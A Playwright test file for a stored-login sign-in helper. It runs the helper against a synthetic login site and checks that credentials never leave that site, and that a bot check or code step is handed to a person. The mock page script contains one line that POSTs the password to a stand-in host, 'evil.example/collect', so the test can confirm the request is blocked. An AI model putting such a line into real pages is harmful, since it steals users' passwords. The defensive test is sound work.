import { chromium, type Browser, type BrowserContext, type Page } from 'playwright'
import { SensitiveValue } from '#lib/credentials/SensitiveValue.ts'
import { assert, test } from '#test'
import { browserBinary } from './mcp/browserDriver.ts'
import { signInWithStoredLogin, type StoredLoginForm } from './storedLogin.ts'

// A synthetic site shaped like the real thing this was built for: an email and
// a password in a GET form the page's own script submits, an invisible bot
// check that fills a hidden token on its own, and a home page after sign-in.
const USERNAME = 'jane@example.com'
const PASSWORD = 'mock-Atlas-password-497!'
const ORIGIN = 'https://atlas.example'
const FORM: StoredLoginForm = {
  loginUrl: `${ORIGIN}/account/login`,
  username: '#email',
  password: '#password',
  submit: 'button[type="submit"]',
  verificationToken: 'input[name="cf-turnstile-response"]',
}

type Site = {
  /** How the page behaves: the check passes, never passes, the script is missing, or a code step follows. */
  mode: 'passes' | 'stuck' | 'no-script' | 'code'
  posts: { email: string; password: string; token: string }[]
  /** Every URL any request was made to, as the site saw it. */
  urls: string[]
  escaped: number
  sessions: number
}

function loginPage(site: Site): string {
  const script =
    site.mode === 'no-script'
      ? ''
      : `<script>
  ${site.mode === 'stuck' ? '' : 'setTimeout(() => { document.querySelector("input[name=cf-turnstile-response]").value = "token-atlas" }, 300)'}
  document.querySelector('form').addEventListener('submit', async (event) => {
    event.preventDefault()
    const body = new URLSearchParams({ email: email.value, password: password.value, token: document.querySelector('input[name=cf-turnstile-response]').value })
    const response = await fetch('/api/auth/callback/credentials', { method: 'POST', body })
    if (!response.ok) { document.getElementById('alert').textContent = 'Incorrect email or password.'; return }
    ${
      site.mode === 'code'
        ? 'document.querySelector("form").innerHTML = "<label>Code <input name=\\"verificationCode\\" autocomplete=\\"one-time-code\\"></label>"'
        : 'fetch("https://evil.example/collect", { method: "POST", body: password.value }).catch(() => {}); location.assign("/")'
    }
  })
</script>`
  return `<title>Atlas sign-in</title><h1>Member Login</h1><form action="/account/login">
<input id="email" name="email" type="text" autocomplete="email" placeholder="Email Address">
<input id="password" name="password" type="password" autocomplete="current-password" placeholder="Password">
<button type="button" aria-label="Show password"></button>
<input type="hidden" name="cf-turnstile-response" value="">
<div id="alert" role="alert"></div>
<button type="submit">Log in</button>
<button type="button">Continue with Google</button>
</form>${script}`
}

async function serve(context: BrowserContext, site: Site): Promise<void> {
  await context.route('**/*', async (route) => {
    const request = route.request()
    const url = new URL(request.url())
    site.urls.push(request.url())
    if (url.origin === 'https://evil.example') {
      site.escaped++
      return route.fulfill({ status: 200, body: 'stolen' })
    }
    if (url.pathname === '/api/auth/callback/credentials' && request.method() === 'POST') {
      const fields = new URLSearchParams(request.postData() ?? '')
      const post = {
        email: fields.get('email') ?? '',
        password: fields.get('password') ?? '',
        token: fields.get('token') ?? '',
      }
      site.posts.push(post)
      const ok = post.email === USERNAME && post.password === PASSWORD && post.token !== ''
      if (ok) site.sessions++
      return route.fulfill({ status: ok ? 200 : 401, contentType: 'application/json', body: '{}' })
    }
    if (url.pathname === '/user/auth_token')
      return route.fulfill({
        status: site.sessions > 0 ? 200 : 302,
        headers: site.sessions > 0 ? {} : { location: '/account/login' },
        contentType: 'application/json',
        body: site.sessions > 0 ? '{"access_token":"mock-token","user_id":"1"}' : '',
      })
    if (url.pathname === '/account/login') return route.fulfill({ contentType: 'text/html', body: loginPage(site) })
    if (url.pathname === '/')
      return route.fulfill({ contentType: 'text/html', body: '<title>Atlas</title><h1>Atlas home</h1>' })
    return route.fulfill({ status: 404, body: '' })
  })
}

const signedIn = (page: Page) => async () => {
  const response = await page.goto(`${ORIGIN}/user/auth_token`, { waitUntil: 'domcontentloaded' })
  return response?.status() === 200 && (await response.text()).includes('access_token')
}

test('a stored login signs in on its own site and never leaves it', { timeout: 120_000 }, async () => {
  const browser: Browser = await chromium.launch({
    executablePath: (await browserBinary()) ?? undefined,
    headless: true,
  })
  const run = async (mode: Site['mode'], login = { user: USERNAME, pass: PASSWORD }) => {
    const values = { username: new SensitiveValue(login.user), password: new SensitiveValue(login.pass) }
    const site: Site = { mode, posts: [], urls: [], escaped: 0, sessions: 0 }
    const context = await browser.newContext()
    const page = await context.newPage()
    const lines: string[] = []
    try {
      await serve(context, site)
      const result = await signInWithStoredLogin(context, FORM, values, {
        signedIn: signedIn(page),
        log: (line) => lines.push(line),
        timeoutMs: 4000,
        verificationWaitMs: 3000,
      })
      return {
        site,
        result,
        lines,
        passwordField: await page
          .locator('#password')
          .inputValue()
          .catch(() => ''),
      }
    } finally {
      await context.close()
    }
  }
  try {
    const passes = await run('passes')
    assert({
      given: 'the check passes on its own and the login is right',
      should:
        'send the login once, land on the home page, prove the session, and keep the values off every other address',
      actual: [
        passes.result.status,
        passes.site.posts,
        passes.site.escaped,
        passes.site.urls.some((url) => url.includes(encodeURIComponent(PASSWORD)) || url.includes(PASSWORD)),
        passes.lines.join('\n').includes(PASSWORD) || passes.lines.join('\n').includes(USERNAME),
      ],
      expected: ['signed_in', [{ email: USERNAME, password: PASSWORD, token: 'token-atlas' }], 0, false, false],
    })

    const stuck = await run('stuck')
    assert({
      given: 'a check the site wants a person to pass',
      should: 'stop before sending anything and ask for the person, with the login left in the fields for them',
      actual: [stuck.result.status, stuck.site.posts.length, stuck.passwordField],
      expected: ['needs_person', 0, PASSWORD],
    })

    const wrong = await run('passes', { user: USERNAME, pass: 'mock-wrong-password' })
    assert({
      given: 'a stored password the site turns away',
      should: 'report the refusal without a second try',
      actual: [wrong.result.status, wrong.site.posts.length, wrong.site.sessions],
      expected: ['rejected', 1, 0],
    })

    const code = await run('code')
    assert({
      given: 'a verification code step after the password',
      should: 'hand the page to the person',
      actual: [code.result.status, code.site.sessions],
      expected: ['needs_person', 1],
    })

    const native = await run('no-script')
    assert({
      given: 'a GET form the page’s script did not take over',
      should: 'block the address that would carry the login, so no request leaves with it',
      actual: [
        native.result.status,
        native.site.urls.some((url) => url.includes(encodeURIComponent(PASSWORD)) || url.includes(PASSWORD)),
        native.site.urls.some((url) => url.includes(encodeURIComponent(USERNAME))),
      ],
      expected: ['needs_person', false, false],
    })
  } finally {
    await browser.close()
  }
})
